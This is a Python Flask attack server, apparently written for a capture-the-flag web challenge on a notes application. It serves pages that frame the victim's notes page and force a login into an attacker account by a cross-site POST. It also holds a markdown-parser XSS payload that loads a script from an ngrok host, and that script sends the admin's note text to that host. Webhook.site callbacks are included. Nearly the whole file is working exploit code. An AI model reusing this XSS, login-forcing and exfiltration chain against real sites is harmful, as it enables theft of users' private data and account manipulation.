from flask import *
from time import sleep
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route("/")
def home():
  return "OK"

ngrok_url = 'http://62ad-119-18-1-255.ngrok.io'

@app.route("/exploit")
def exploit():
 return '''
 <html>
 <head>
 <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
 </head>
  <div id=iframe1></div>
 </div>
 </html>
<script>
async function main(){
  fetch("https://webhook.site/03bdd3ef-2a80-44d9-a00d-1ee918d12ad9?fetch=fetch1").
  then(res => res.text()).
  then(data => {
    fetch("https://webhook.site/03bdd3ef-2a80-44d9-a00d-1ee918d12ad9?data=data1");
  }).
  catch(err => {
    console.log(err);
    fetch("https://webhook.site/03bdd3ef-2a80-44d9-a00d-1ee918d12ad9?error=error1");
  });
}
main();
</script>
'''

@app.route("/exp")
def main():
 return '''
 <html>
 <head>
 <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
 </head>
 <img src=/sleep.png/>
 <div id=iframe1></div>
 <div id=iframe2></div>
 </div>
 </html>
<script>
function sleep(ms) {
 return new Promise(resolve => setTimeout(resolve, ms));
}
async function main(){
 ifr = document.createElement('iframe');
 ifr.src = "http://localhost:8080/notes";
 ifr.name='admin';
 iframe1.appendChild(ifr);
 await sleep(500);
 ifr2 = document.createElement('iframe');
 ifr2.width="50%";
 ifr2.height="50%";
 ifr2.name='attack';
 ifr2.src = "/change-account";
 iframe2.appendChild(ifr2);
}
main();
</script>
'''


@app.route("/sleep.png")
def sledp():
 sleep(10)
 return ""

# #second-tab
# @app.route("/redirect")
# def redi():
#  sleep(4)
#  return redirect("https://notes.web.byteband.it/profile#redirect")

#third-tab
@app.route("/change-account")
def change():
 return '''
 <html>
 <head>
 <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
 </head>
 </html>
<script>
function sleep(ms) {
 return new Promise(resolve => setTimeout(resolve, ms));
}
async function main(){
 await sleep(500);
 ifr = document.createElement('iframe');
 ifr.src = "http://localhost:8080/notes";
 document.body.appendChild(ifr);
 await sleep(500);
fetch("http://localhost:8080/login",
{
    headers: {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    method: "POST",
    body: "username=nc&password=nc"
})
.then(function(res){
  fetch("http://localhost:8080/notes")
  .then(function(res) {
    console.log(res);
  })
})
.catch(function(res){ console.log(res) })

}
main();
</script>
'''

@app.route("/final.js")
def js():
  resp = Response(script)
  resp.headers['Content-Type'] = 'text/javascript'
  return resp

payload = """<http://g<!s://q?<!-<[<script>dd = document.createElement("script");dd.src = "{ngrok_url}/final.js";document.head.appendChild(dd);/\*](http://g)->a><http://g<!s://g.c?<!-<[a\\*/</script>aler(1);/*](http://g)->a>"""
script = '''window.location = "{ngrok_url}?a="+parent.admin.document.getElementsByTagName('p')[1].innerText;
'''

if __name__=='__main__':
 app.run(debug=True)